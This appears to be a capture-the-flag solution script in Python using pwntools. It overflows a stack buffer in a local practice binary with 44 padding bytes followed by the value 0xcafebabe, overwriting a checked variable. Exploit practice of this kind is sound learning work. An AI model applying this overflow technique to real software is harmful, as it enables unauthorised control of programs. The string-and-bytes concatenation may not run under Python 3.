from pwn import *

elf = context.binary = ELF("./pwn-intended-0x2", checksec=False)

io = elf.process()

offset = 44
payload = "A"*offset + p64(0xcafebabe)

print(io.recvline())
io.sendline(payload)
print(io.recv())


